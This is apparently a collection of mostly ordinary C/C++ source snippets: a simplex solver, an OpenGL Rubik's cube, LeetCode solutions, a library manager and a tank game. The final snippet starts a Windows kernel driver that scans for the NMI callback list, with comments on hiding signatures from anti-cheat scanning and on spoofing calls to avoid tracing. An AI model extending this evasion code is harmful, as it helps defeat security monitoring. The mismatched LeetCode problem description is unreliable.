    "#include <iostream>\n#include <vector>\n#include <iomanip>\n#include <limits>\n#include <fstream>\n\nusing namespace std;\n\nusing Matrix = vector<vector<double>>;\nusing Vector = vector<double>;\n\nconst double EPS = 1e-9; //constante para evitar erro num\u00e9rico\n\nvoid printTable(const Matrix& table){\n    for(const auto& row : table){\n        for(const auto& val : row){\n            cout << setw(10) << val << \" \";\n        }\n        cout << endl;\n    }\n    cout << endl;\n}\n\n//fun\u00e7\u00e3o para verificar se a solu\u00e7\u00e3o \u00e9 \u00f3tima\nbool isOptimal(const Matrix& table){\n    //olho se todos os elementos do meu custo s\u00e3o < -EPS\n    const Vector& objective = table.back();\n    for(int i=0;i<objective.size()-1;i++){\n        if(objective[i] < -EPS){\n            return false;\n        }\n    }\n    return true;\n}\n\n//fun\u00e7\u00e3o para selecionar a coluna piv\u00f4\nint getPivotColumn(const Matrix& table){\n    const Vector& objective = table.back();\n    int pivotCol = 0;\n    //seleciono o menor elemento do meu custo\n    for(int i = 1; i < objective.size() - 1; ++i){\n        if(objective[i] < objective[pivotCol]){\n            pivotCol = i;\n        }\n    }\n    return pivotCol;\n}\n\n//fun\u00e7\u00e3o para selecionar a linha piv\u00f4\nint getPivotRow(const Matrix& table, int pivotCol){\n    int pivotRow = -1;\n    double minRatio = numeric_limits<double>::infinity();\n    //caso eu n\u00e3o encontre linha v\u00e1lida retorno -1\n    for(int i = 0; i < table.size() - 1; ++i){\n        double element = table[i][pivotCol];\n        //considera-se somente raz\u00f5es com elementos positivos\n        if(element > EPS){ \n            double ratio = table[i].back() / element;\n            if(ratio >= 0 && ratio < minRatio){\n                minRatio = ratio;\n                pivotRow = i;\n            }\n        }\n    }\n    return pivotRow;\n}\n\n//fun\u00e7\u00e3o para pivotear a linha\nvoid pivot(Matrix& table, int pivotRow, int pivotCol, Matrix& optimalAuxiliar){\n    double pivotElement = table[pivotRow][pivotCol];\n\n    //divis\u00e3o da linha piv\u00f4 pelo elemento piv\u00f4\n    for(int i=0;i<table[0].size();i++){\n        if(table[pivotRow][i] != 0){\n            table[pivotRow][i] = table[pivotRow][i] / pivotElement;\n        }\n    }\n    //replica\u00e7\u00e3o da opera\u00e7\u00e3o na matriz do certificado\n    for(int i=0;i<optimalAuxiliar[0].size();i++){\n        if(optimalAuxiliar[pivotRow][i] != 0){\n            optimalAuxiliar[pivotRow][i] = optimalAuxiliar[pivotRow][i] / pivotElement;\n        }\n    }\n\n    //atualizando as outras linhas para zerar a coluna do piv\u00f4\n    for(int i = 0; i < table.size(); ++i){\n        if(i != pivotRow){\n            double factor = table[i][pivotCol];\n            for(int j = 0; j < table[i].size(); ++j){\n                // double calculus = factor * table[pivotRow][j];\n                // if(calculus != 0) \n                table[i][j] -= factor * table[pivotRow][j];\n            }\n            //aplicando mesma opera\u00e7\u00e3o na matriz do certificado\n            for(int h=0;h<optimalAuxiliar[0].size();++h){\n                // double calculus = factor * optimalAuxiliar[pivotRow][h];\n                // if(calculus != 0) \n                optimalAuxiliar[i][h] -= factor * optimalAuxiliar[pivotRow][h];\n            }\n        }\n    }\n}\n\n//fun\u00e7\u00e3o para checar se minha PL \u00e9 ilimitada\nbool checkUnbounded(Matrix& table, Vector& unboudedCertificate, int pivotCol){\n    bool isUnbounded = true;\n    //caso a minha coluna piv\u00f4 seja toda negativa, a PL \u00e9 ilimitada\n    for(int i=0;i<table.size()-1;i++){\n        if(table[i][pivotCol] > EPS){\n            isUnbounded = false;\n            return isUnbounded;\n        }\n        else{\n            continue;\n        }\n    }\n\n    return isUnbounded;\n}\n\n//fun\u00e7\u00e3o para construir meu certificado de ilimitado\nvoid buildUnbounded(Matrix& table, Vector& unboudedCertificate, int pivotCol){\n    unboudedCertificate[pivotCol] = 1;\n    int rows = table.size() - 1;\n\n    //dado que estou no meu formato can\u00f4nico, eu consigo montar o certificado identificando colunas b\u00e1sicas e n\u00e3o b\u00e1sicas\n    for(int j = 0; j < table[0].size() - 1; ++j){\n        int zeros = 0;\n        int uns = 0;\n        \n        for(int i=0;i<table.size()-1;i++){\n            if(table[i][j] == 1) uns++;\n            else if(table[i][j] == 0) zeros++;\n        }\n        if(uns ==1 && zeros==table.size()-2 && j!=pivotCol){\n            \n            int pos = 0;\n            for(int h=0;h<table.size()-1;h++){\n                if(table[h][j] == 1){\n                    pos = h;\n                    break;\n                }\n            }\n            unboudedCertificate[j] = -1*table[pos][pivotCol];\n        }\n    }\n\n}\n\n//fun\u00e7\u00e3o principal do Simplex\nint Simplex(Matrix& table, Matrix& optimalAuxiliar, int viability, int flag, vector<int>& zeroColumns, Vector& unboudedCertificate){\n    int counter = 0;\n    vector<int> baseLines;\n    //resolvendo a auxiliar - 1\u00aa FASE\n    if(flag==0){\n        while(!isOptimal(table)){\n            int pivotCol = getPivotColumn(table);\n            int pivotRow = getPivotRow(table, pivotCol);\n\n            pivot(table, pivotRow, pivotCol, optimalAuxilia",
    "#include <GL\\glew.h>\r\n#include <GL\\freeglut.h>\r\n#include <iostream>\r\n#include <vector>\r\n#include <stack>\r\n#include <ctime>\r\n\r\n#pragma warning(disable : 4996)\r\n\r\nconstexpr auto SPEED = 8;\r\nconstexpr auto SPEED2 = 3;\r\nusing namespace std;\r\n\r\nfloat angle = 0.0;\r\nfloat lx = 0.0f, lz = -1.0f;\r\nfloat x = 0.0f, z = 5.0f;\r\nstatic int G = 0.0;\r\nstatic double sizem = 0;\r\nint col[6] = { 0xFFFFFF, 0xFFFF00, 0x0000FF, 0x00FF00, 0xFF0000, 0xCD853F};\r\nint x_rot = 22;\r\nint y_rot = 36;\r\n\r\n\r\nclass small_cube{\r\nprivate:\r\n\tunsigned char RGB_[3];\r\npublic:\r\n\tint color[6]; // \u00e2\u00e5\u00f0\u00f5(0), \u00ed\u00e8\u00e7(1), \u00ef\u00e5\u00f0\u00e5\u00e4(2), \u00e7\u00e0\u00e4(3), \u00eb\u00e5\u00e2\u00ee(4), \u00ef\u00f0\u00e0\u00e2\u00ee(5)\r\n\tdouble size;\r\n\r\n\tsmall_cube(){\r\n\r\n\t\tfor (int i = 0; i < 3; i++) {\r\n\t\t\tRGB_[i] = ' ';\r\n\t\t}\r\n\r\n\t\tfor (int i = 0; i < 6; i++) {\r\n\t\t\tcolor[i] = 0;\r\n\t\t}\r\n\r\n\t\tsize = 0.0;\r\n\t}\r\n\r\n\r\n\tvoid install(int i, int color){\r\n\t\tthis->color[i] = color;\r\n\t}\r\n\r\n\tunsigned char* at(int i){\r\n\t\tRGB_[0] = color[i] >> 16;\r\n\t\tRGB_[1] = color[i] >> 8;\r\n\t\tRGB_[2] = color[i];\r\n\t\treturn RGB_;\r\n\t}\r\n\r\n\tvoid draw1(){\r\n\t\tglPushMatrix();\r\n\t\tglBegin(GL_QUADS);\r\n\r\n\t\t// \u00e2\u00e5\u00f0\u00f5\r\n\t\tglColor3ubv(at(0));\r\n\t\tglNormal3f(0, 0, 1);\r\n\t\tglVertex3f(size, size, size);\r\n\t\tglVertex3f(0, size, size);\r\n\t\tglVertex3f(0, 0, size);\r\n\t\tglVertex3f(size, 0, size);\r\n\r\n\t\t// \u00ed\u00e8\u00e7\r\n\t\tglColor3ubv(at(1));\r\n\t\tglNormal3f(0, 0, -1);\r\n\t\tglVertex3f(size, 0, 0);\r\n\t\tglVertex3f(0, 0, 0);\r\n\t\tglVertex3f(0, size, 0);\r\n\t\tglVertex3f(size, size, 0);\r\n\r\n\t\t// \u00f1\u00ef\u00e5\u00f0\u00e5\u00e4\u00e8\r\n\t\tglColor3ubv(at(2));\r\n\t\tglNormal3f(0, -1, 0);\r\n\t\tglVertex3f(size, 0, size);\r\n\t\tglVertex3f(0, 0, size);\r\n\t\tglVertex3f(0, 0, 0);\r\n\t\tglVertex3f(size, 0, 0);\r\n\r\n\t\t// \u00f1\u00e7\u00e0\u00e4\u00e8\r\n\t\tglColor3ubv(at(3));\r\n\t\tglNormal3f(0, 1, 0);\r\n\t\tglVertex3f(size, size, 0);\r\n\t\tglVertex3f(0, size, 0);\r\n\t\tglVertex3f(0, size, size);\r\n\t\tglVertex3f(size, size, size);\r\n\r\n\t\t// \u00f1\u00eb\u00e5\u00e2\u00e0\r\n\t\tglColor3ubv(at(4));\r\n\t\tglNormal3f(-1, 0, 0);\r\n\t\tglVertex3f(0, size, size);\r\n\t\tglVertex3f(0, size, 0);\r\n\t\tglVertex3f(0, 0, 0);\r\n\t\tglVertex3f(0, 0, size);\r\n\r\n\t\t// \u00f1\u00ef\u00f0\u00e0\u00e2\u00e0\r\n\t\tglColor3ubv(at(5));\r\n\t\tglNormal3f(1, 0, 0);\r\n\t\tglVertex3f(size, size, 0);\r\n\t\tglVertex3f(size, size, size);\r\n\t\tglVertex3f(size, 0, size);\r\n\t\tglVertex3f(size, 0, 0);\r\n\r\n\t\tglEnd();\r\n\t\tglPopMatrix();\r\n\t}\r\n\r\n\tvoid rotateX(){\r\n\t\tint tmp = color[0];\r\n\t\tcolor[0] = color[4];\r\n\t\tcolor[4] = color[1];\r\n\t\tcolor[1] = color[5];\r\n\t\tcolor[5] = tmp;\r\n\t}\r\n\r\n\tvoid rotateY(){\r\n\t\tint tmp = color[2];\r\n\t\tcolor[2] = color[1];\r\n\t\tcolor[1] = color[3];\r\n\t\tcolor[3] = color[0];\r\n\t\tcolor[0] = tmp;\r\n\t}\r\n\r\n\tvoid rotateZ(){\r\n\t\tint tmp = color[5];\r\n\t\tcolor[5] = color[3];\r\n\t\tcolor[3] = color[4];\r\n\t\tcolor[4] = color[2];\r\n\t\tcolor[2] = tmp;\r\n\t}\r\n\r\n\r\n\r\n\tvoid draw(double x, double y, double z){\r\n\t\tglPushMatrix();\r\n\t\tglTranslated(x, y, z);\r\n\t\tdraw1();\r\n\t\tglPopMatrix();\r\n\t}\r\n};\r\n\r\n//static small_cube a[3][3][3];\r\n//static int rotate1[6];\r\n//static double size1;\r\n//static int color[6];\r\n//static bool check[3][3][3];\r\n//static int curr_gr;\r\n\r\nclass Cube{\r\nprivate:\r\n\t//secind part\r\n\t//rotate!!!\r\n\tint _angle[3];\r\n\tbool check[3][3][3];\r\n\tsmall_cube tmp[3][3];\r\n\r\n\r\n\t//first part\r\n\tsmall_cube a[3][3][3];\r\n\tint rotate[6];\r\n\tdouble size;\r\n\tint color[6];\r\n\tint tmp1;\r\n\r\npublic:\r\n\tint curr_gr;\r\n\r\n\tCube() {\r\n\r\n\t\tcurr_gr = 0;\r\n\r\n\t\tfor (int i = 0; i < 3; i++) {\r\n\t\t\t_angle[i] = 0;\r\n\t\t}\r\n\r\n\t\tfor (int i = 0; i < 6; i++) {\r\n\t\t\trotate[i] = 0;\r\n\t\t}\r\n\r\n\t\tfor (int i = 0; i < 6; i++) {\r\n\t\t\tcolor[i] = ' ';\r\n\t\t}\r\n\r\n\t\tsize = 0;\r\n\r\n\t}\r\n\r\n\tvoid create(double size, int* color){\r\n\r\n\t\tfor (int i = 0; i < 6; i++) {\r\n\t\t\trotate[i] = 0;\r\n\t\t}\r\n\r\n\t\tthis->size = size;\r\n\t\tcurr_gr = -1;\r\n\r\n\t\tfor (int i = 0; i < 6; i++) {\r\n\t\t\tthis->color[i] = color[i];\r\n\t\t}\r\n\r\n\t\t// \u00e2\u00e5\u00f0\u00f5\r\n\t\tfor (int i = 0; i < 3; i++) {\r\n\t\t\tfor (int j = 0; j < 3; j++) {\r\n\t\t\t\ta[i][j][2].install(0, color[0]);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\t// \u00ed\u00e8\u00e7\r\n\t\tfor (int i = 0; i < 3; i++) {\r\n\t\t\tfor (int j = 0; j < 3; j++) {\r\n\t\t\t\ta[i][j][0].install(1, color[1]);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\t// \u00f1\u00ef\u00e5\u00f0\u00e5\u00e4\u00e8\r\n\t\tfor (int k = 0; k < 3; k++) {\r\n\t\t\tfor (int j = 0; j < 3; j++) {\r\n\t\t\t\ta[j][0][k].install(2, color[2]);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\t// \u00f1\u00e7\u00e0\u00e4\u00e8\r\n\t\tfor (int k = 0; k < 3; k++) {\r\n\t\t\tfor (int j = 0; j < 3; j++) {\r\n\t\t\t\ta[j][2][k].install(3, color[3]);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\t// \u00f1\u00eb\u00e5\u00e2\u00e0\r\n\t\tfor (int i = 0; i < 3; i++) {\r\n\t\t\tfor (int k = 0; k < 3; k++) {\r\n\t\t\t\ta[0][k][i].install(4, color[4]);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\t// \u00f1\u00ef\u00f0\u00e0\u00e2\u00e0\r\n\t\tfor (int i = 0; i < 3; i++) {\r\n\t\t\tfor (int k = 0; k < 3; k++) {\r\n\t\t\t\ta[2][k][i].install(5, color[5]);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tfor (int i = 0; i < 3; i++) {\r\n\t\t\tfor (int j = 0; j < 3; j++) {\r\n\t\t\t\tfor (int k = 0; k < 3; k++) {\r\n\t\t\t\t\ta[i][j][k].size = (size / 3.0) * 0.85;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\tvoid draw(){\r\n\r\n\t\tfor (int i = 0; i < 3; i++) {\r\n\t\t\tfor (int j = 0; j < 3; j++) {\r\n\t\t\t\tfor (int k = 0; k < 3; k++) {\r\n\t\t\t\t\tcheck[i][j][k] = true;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif (curr_gr != -1){\r\n\t\t\tglPushMatrix();\r\n\t\t\tint i, j, k;\r\n\r\n\t\t\tif (curr_gr == 0 || curr_gr == 1){\r\n\r\n\t\t\t\tk = (curr_gr & 1) * 2;\r\n\t\t\t\tfor (i = 0; i < 3; i++) {\r\n\t\t\t\t\tfor (j = 0; j < 3; j++) {\r\n\t\t\t\t\t\tcheck[i][j][k] = false;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\r\n\t\t\t\t\tglTranslated(size / 2, size / 2, 0);   \r\n\t\t\t\t\tglRotatef(rotate[curr_gr], 0, 0, 1);   \r\n\t\t\t\t\tglTrans",
    "#define _CRT_SECURE_NO_WARNINGS 1\n\n#include<iostream>\n#include\"AVLTree.h\"\n#include<vector>\n\n\nusing namespace std;\n\nclass Solution0 {\npublic:\n    long long numberOfRightTriangles(vector<vector<int>>& grid) {\n        int n = grid.size(); // \u786e\u4fddn\u662f\u7f51\u683c\u7684\u5217\u6570\n        vector<int> col_sum(n, 0); // \u521d\u59cb\u5316\u4e3a0\uff0c\u907f\u514d\u51cf1\u64cd\u4f5c\n\n        for (auto& row : grid) {\n            for (int j = 0; j < n; j++) {\n                col_sum[j] += row[j]; // \u8ba1\u7b97\u6bcf\u5217\u76841\u7684\u4e2a\u6570\n            }\n        }\n\n        long long ans = 0;\n        for (auto& row : grid) {\n            int row_sum = std::count(row.begin(), row.end(), 1); // \u4f7f\u7528std::count\u8ba1\u7b97\u5f53\u524d\u884c1\u7684\u4e2a\u6570\n\n            for (size_t j = 0; j < row.size(); j++) { // \u4f7f\u7528size_t\u786e\u4fddj\u5728\u5408\u6cd5\u8303\u56f4\u5185\n                if (row[j] == 1) {\n                    // \u786e\u4fddcol_sum[j]\u5728\u5408\u6cd5\u8303\u56f4\u5185\n                    if (j < col_sum.size()) {\n                        ans += row_sum * col_sum[j];\n                    }\n                }\n            }\n        }\n        return ans;\n    }\n};\n\n\nint main()\n{\n    TestAVLTree1();\n\tTestAVLTree2();\n\n\treturn 0;\n}\n",
    "//\n// Created by 21909 on 2024/8/4.\n//\n\n#include \"Factory.h\"\nsingleton::FactoryManager *singleton::FactoryManager::getInstance() {\n    static FactoryManager instance;\n    return &instance;\n}\n\nproducts::Product *singleton::FactoryManager::createProduct(std::string name) {\n    return factory::ProductFactory::makeProduct(name);\n}\n\nvoid singleton::FactoryManager::assignStrategy(products::Product *pro, std::string str) {\n    pro->strategy_choice_=factory::StrategyFactory::setStrategy(str);\n}\n\nproducts::Product *factory::ProductFactory::makeProduct(const std::string& str) {\n    if(str==\"ProductA\"){//\u53ef\u4ee5\u4f7f\u7528\u914d\u7f6e\u6587\u4ef6\u5b9e\u73b0\uff0c\u7701\u53bbif-else\u7ed3\u6784\n        return new products::ProductA();\n    }else if(str==\"ProductB\"){\n        return new products::ProductB();\n    }else if(str==\"ProductC\") {\n        return new products::ProductC();\n    }else{\n        std::cout<<\"\u6ca1\u6709\u6b64\u4ea7\u54c1\"<<std::endl;\n        exit(0);\n    }\n}\n\nstrategies::Strategy *factory::StrategyFactory::setStrategy(const std::string &str) {\n    if(str==\"Heating\"){\n        return new strategies::Heat();\n    }else if(str==\"Cooling\"){\n        return new strategies::Cool();\n    }else if(str==\"Mixing\"){\n        return new strategies::Mix();\n    }else{\n        std::cout<<\"\u65e0\u6b64\u52a0\u5de5\u65b9\u5f0f\"<<std::endl;\n        exit(0);\n    }\n}\n",
    "/*\nProblem: LeetCode 778 - Swim in Rising Water\n\nDescription:\nOn an N x N grid, each cell is either empty (0) or blocked (1).\nA move consists of walking from one empty cell to another empty cell adjacent to it\nin one of the 4 cardinal directions (up, down, left, right).\nTime starts at 0, and each time you visit an empty cell, you walk to an adjacent empty\ncell and increase time by 1.\nThe grid is said to be unreachable if we cannot walk from the top-left corner of the grid\n(0, 0) to the bottom-right corner of the grid (N-1, N-1) without walking through any\nblocked cells.\nReturn the minimum time required to reach the bottom-right corner of the grid, or -1 if\nthe grid is unreachable.\n\nIntuition:\nThis problem can be solved using a binary search approach. We can search for the minimum\ntime required to reach the bottom-right corner, and then verify if it is possible to\nreach the destination using that time.\n\nApproach:\n1. Implement a Depth-First Search (DFS) function that explores the grid to check if it is\n   possible to reach the destination within a given time t. The DFS function takes the\n   current position (x, y), the time t, the grid, and a visited set to track visited cells.\n2. In the DFS function, check if the current position is out of bounds or blocked, and\n   return false if so.\n3. Check if the current position is the destination (bottom-right corner) and return true\n   if so.\n4. Mark the current position as visited and recursively call the DFS function for all\n   adjacent empty cells (up, down, left, right) with time t as the parameter.\n5. If any of the recursive calls return true, it means we can reach the destination within\n   time t, so return true.\n6. If none of the recursive calls return true, return false, indicating that it is not\n   possible to reach the destination within time t.\n7. Now, use a binary search to find the minimum time required to reach the destination.\n   The search range is from 0 to the maximum height in the grid.\n8. While the low is less than or equal to the high, calculate the mid as (low + high) / 2\n   and call the DFS function with time mid to check if it is possible to reach the\n   destination within mid time.\n9. If the DFS function returns true, it means it is possible to reach the destination\n   within mid time, so set high to mid - 1 to search for smaller time.\n10. Otherwise, set low to mid + 1 to search for larger time.\n11. After the binary search, return low as the minimum time required to reach the\n    destination if reachable, or -1 if unreachable.\n\nTime Complexity:\nThe time complexity of the binary search is O(log N * N), where N is the side length of\nthe grid. The DFS function visits all empty cells in the grid, so the overall time\ncomplexity is O(N^2).\n\nSpace Complexity:\nThe space complexity is O(N^2) due to the visited set used in the DFS function.\n*/\n\nclass Solution {\n  public:\n    bool dfs(int x, int y, int t, vector<vector<int>> &grid) {\n        int n = grid.size();\n\n        // Check if current position is out of bounds or blocked\n        if (x < 0 || x >= n || y < 0 || y >= n || grid[x][y] > t) {\n            return false;\n        }\n\n        // Check if current position is destination\n        if (x == n - 1 && y == n - 1) {\n            return true;\n        }\n\n        int prev = grid[x][y];\n        grid[x][y] = -1; // Mark the cell as visited\n        // Recursively call DFS for all adjacent empty cells\n        bool canReach = dfs(x + 1, y, t, grid) ||\n                        dfs(x - 1, y, t, grid) ||\n                        dfs(x, y + 1, t, grid) ||\n                        dfs(x, y - 1, t, grid);\n        grid[x][y] = prev; // Reset the cell to its original value\n        return canReach;\n    }\n\n    int swimInWater(vector<vector<int>> &grid) {\n        int n = grid.size();\n        int low = 0, high = n * n - 1;\n\n        while (low <= high) {\n            int mid = low + (high - low) / 2;\n\n            // Check if it is possible to reach destination within time mid\n            if (dfs(0, 0, mid, grid)) {\n                high = mid - 1;\n            } else {\n                low = mid + 1;\n            }\n        }\n\n        return low;\n    }\n};\n\n/*\n// Beats 100% Runtime\n\nclass Solution {\npublic:\n    int swimInWater(vector<vector<int>>& grid) {\n        int n = grid.size();\n        int left = max(grid[0][0], grid[n - 1][n - 1]); // Smallest possible value to start the binary search.\n        int right = n * n - 1; // Largest possible value to end the binary search.\n\n        while (left <= right) {\n            int mid = (left + right) / 2;\n            vector<vector<bool>> visited(n, vector<bool>(n, false));\n            if (dfs(grid, visited, 0, 0, mid)) {\n                // If it's possible to reach the destination with the threshold \"mid\",\n                // try to find a better (smaller) threshold in the left half of the binary search space.\n                right = mid - 1;\n            } else {\n                // If it's not possible to reach the destination with the thre",
    "#include <iostream>\n#include <vector>\n#include <string>\n\nusing namespace std;\n\nclass Library {\npublic:\n    int id;\n    string name;\n    string student;\n    string author;\n    int price;\n    int pages;\n\n    void inputDetails() {\n        cout << \"Enter Book Id: \";\n        cin >> id;\n        cin.ignore(); // Ignore the newline character left in the input buffer\n\n        cout << \"Enter Book Name: \";\n        getline(cin, name);\n\n        cout << \"Enter Book Author: \";\n        getline(cin, author);\n\n        cout << \"Enter Student Name: \";\n        getline(cin, student);\n\n        cout << \"Enter Book Price: \";\n        cin >> price;\n        cin.ignore();\n    }\n\n    void displayDetails() const {\n        cout << \"Book Id: \" << id << '\\n'\n             << \"Book Name: \" << name << '\\n'\n             << \"Author Name: \" << author << '\\n'\n             << \"Student Name: \" << student << '\\n'\n             << \"Book Price: \" << price << '\\n';\n    }\n};\n\nvoid displayMenu() {\n    cout << \"Enter 1 to input details like id, name, author, student, etc.\\n\"\n         << \"Enter 2 to display details\\n\"\n         << \"Enter 3 to search a book by id\\n\"\n         << \"Enter 4 to update details of a book by id\\n\"\n         << \"Enter 5 to delete a book by id\\n\"\n         << \"Enter 6 to quit\\n\";\n}\n\nbool setPassword(string &password) {\n    string password1, password2;\n\n    cout <<\"-------Welcome to our library-------\\n\" << \"Please Set Your Password: \";\n    cin >> password1;\n\n    cout << \"Confirm your password: \";\n    cin >> password2;\n\n    if (password1 == password2) {\n        password = password1;\n        return true;\n    } else {\n        cout << \"Passwords do not match! Try again.\\n\";\n        return false;\n    }\n}\n\nbool checkPassword(const string &password) {\n    string inputPassword;\n\n    cout << \"Enter password to proceed: \";\n    cin >> inputPassword;\n\n    return inputPassword == password;\n}\n\nvoid inputBookDetails(vector<Library>& lib) {\n    Library book;\n    book.inputDetails();\n    lib.push_back(book);\n}\n\nvoid displayBookDetails(const vector<Library>& lib) {\n    for (vector<Library>::const_iterator it = lib.begin(); it != lib.end(); ++it) {\n        it->displayDetails();\n        cout << '\\n';\n    }\n}\n\nvoid searchBook(const vector<Library>& lib){\n    int searchId;\n    cout << \"Enter the book Id to search: \";\n    cin >> searchId;\n\n    for (vector<Library>::const_iterator it = lib.begin(); it != lib.end(); ++it) {\n        if (it->id == searchId) {\n            it->displayDetails();\n            return;\n        }\n    }\n\n    cout << \"Book not found.\\n\";\n}\n\nvoid updateBook(vector<Library>& lib){\n    int updateId;\n    cout << \"Enter the book Id to update: \";\n    cin >> updateId;\n    cin.ignore();\n\n    for (vector<Library>::iterator it = lib.begin(); it != lib.end(); ++it) {\n        if (it->id == updateId) {\n            cout << \"Updating book details:\\n\";\n            it->inputDetails();\n            cout << \"Book details updated.\\n\";\n            return;\n        }\n    }\n\n    cout << \"Book not found.\\n\";\n}\n\nvoid deleteBook(vector<Library>& lib){\n    int deleteId;\n    cout << \"Enter the book Id to delete: \";\n    cin >> deleteId;\n\n    for (vector<Library>::iterator it = lib.begin(); it != lib.end(); ++it) {\n        if (it->id == deleteId) {\n            lib.erase(it);\n            cout << \"Book deleted.\\n\";\n            return;\n        }\n    }\n\n    cout << \"Book not found.\\n\";\n}\n\nint main() {\n    vector<Library> lib;\n    int input = 0;\n    string password;\n\n    // Set the initial password\n    while (!setPassword(password));\n\n    while (true) {\n        if (!checkPassword(password)) {\n            cout << \"Incorrect password! Access denied.\\n\";\n            continue;\n        }\n\n        displayMenu();\n        cin >> input;\n\n        switch (input) {\n        case 1:\n            inputBookDetails(lib);\n            break;\n        case 2:\n            displayBookDetails(lib);\n            break;\n        case 3:\n            searchBook(lib);\n            break;\n        case 4:\n            updateBook(lib);\n            break;\n        case 5:\n            deleteBook(lib);\n            break;\n        case 6:\n            cout << \"Exiting the program.\\n\";\n            return 0;\n        default:\n            cout << \"!! You have entered a wrong value !!\\n\"\n                 << \"Please try again.....\\n\";\n        }\n    }\n\n    return 0;\n}\n",
    "#include \"graphics.h\"\n#include <time.h>\n#include <stdlib.h>\n#include <stdio.h>\n\n\nvoid player(int x, int y) {\n\treadimagefile(\"ptank.gif\", x * 50, y * 50, x * 50 + 50, y * 50 + 50);\n}\n\nvoid shoot(int zx, int zy) {\n\treadimagefile(\"fire.gif\", zx, zy, zx + 50, zy - 50);\n}\n\n\nvoid main() {\n\tinitwindow(1010, 510);\n\t//setbkcolor(GREEN);\n\tclearviewport();\n\tsetcolor(BLACK);\n\tsrand((unsigned)time(NULL));\n\t//setbkcolor(GREEN);\n\n\tint map[10][20] = {\n{1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n{1, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n{1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n{1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}\n\t};\n\tint lifes = 3;\n\tint key = 0;\n\tint px = 1, py = 1;\n\tint frame = 0;\n\tint cnt = 0;\n\tint zx = -1, zy = -1;\n\t\n\n\t// space = 32 \n\twhile (lifes > 0) {\n\t\tif (kbhit()) {\n\t\t\tkey = getch();\n\t\t\t//printf(\"%d\\n\", key);\n\t\t\tswitch (key) {\n\t\t\tcase 77: player(px++, py);  break;\n\t\t\tcase 72: player(px, py--); break;\n\t\t\tcase 80: player(px, py++);  break;\n\t\t\tcase 75: player(px--, py);  break;\n\t\t\tcase 32: zx = px; zy = py; shoot(zy++, zy++); break;\n\t\t\t}\n\t\t}\n\t\telse { key = 0; }\n\t\t\n\n\n\t\tif (frame == 50000) {\n\t\t\tsetactivepage(cnt % 2);\n\t\t\tclearviewport();\n\t\t\treadimagefile(\"map.gif\", 0, 0, 1000, 500);\n\t\t\tfor (int i = 0; i < 10; i++) {\n\t\t\t\tfor (int j = 0; j < 20; j++) {\n\t\t\t\t\tswitch (map[i][j]) {\n\t\t\t\t\tcase 2:\n\t\t\t\t\tplayer(px, py); break;\n\t\t\t\t\t\n\t\t\t\t\t}\n\t\t\t\n\t\t\t\t}\t\n\t\t\t}\n\t\t\n\t\t\t\n\t\t\tsetvisualpage(cnt % 2);\n\t\t\tcnt++;\n\t\t\t\n\n\t\t\t\n\t\t\tframe = 0;\n\t\t}\n\t\tframe++;\n\t}\n\n\n\n\tdelay(1000000000);\n}\n\t\n/*\n\t\tif (buttn == 72 up arrow) { map[y][x]++; y++; delay(500);}\n\t\tif (buttn == 80 don arrow) {  }\n\t\tif (buttn == 77 right arrow) {  }\n\t\tif (buttn == 75)\n*/",
    "#include <ntifs.h>\n#include <ntddk.h>\n#include <wdm.h>\n#include <ntimage.h>\n#include <stdint.h>\n#include <ntstrsafe.h>\n\n#include \"../kernel/modules.h\"\n\n/*\n- Use Udman Spoof Calls to avoid tracing\n- Use XOR for strings & signatures\n- Use SpoofCall & SpoofFunc Functions\n- Dont paste.\n*/\n\nextern \"C\" DRIVER_INITIALIZE DriverEntry;\n\ntypedef struct _KNMI_HANDLER_CALLBACK\n{\n\tstruct _KNMI_HANDLER_CALLBACK* Next;\n\tvoid(*Callback)();\n\tvoid* Context;\n\tvoid* Handle;\n} KNMI_HANDLER_CALLBACK, * PKNMI_HANDLER_CALLBACK;\n\ntypedef struct _KAFFINITY_EX\n{\n\tUSHORT Count;                                                           //0x0\n\tUSHORT Size;                                                            //0x2\n\tULONG Reserved;                                                         //0x4\n\tULONGLONG Bitmap[20];                                                   //0x8\n} KAFFINITY_EX, * PKAFFINITY_EX;\n\ntypedef ULONG KEPROCESSORINDEX;\nextern \"C\" NTSYSAPI BOOLEAN  NTAPI KeInterlockedSetProcessorAffinityEx(PKAFFINITY_EX pAffinity, KEPROCESSORINDEX idxProcessor);\n\nPKNMI_HANDLER_CALLBACK SigscanKiNmiCallbackListHead() {\n\tuintptr_t ntos_base_address = modules::get_ntos_base_address();\n\n\t// nmi_in_progress function (signature)\n\tchar NmiSignature[] = \"\\x81\\x25\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xB9\\x00\\x00\\x00\\x00\"; // use XOR to encrypt this (will get sig scanned by ac)\n\tchar NmiSignatureMask[] = \"xx????????x????\"; // use XOR to encrypt this (will get sig scanned by ac)\n\tuintptr_t nmi_in_progress = 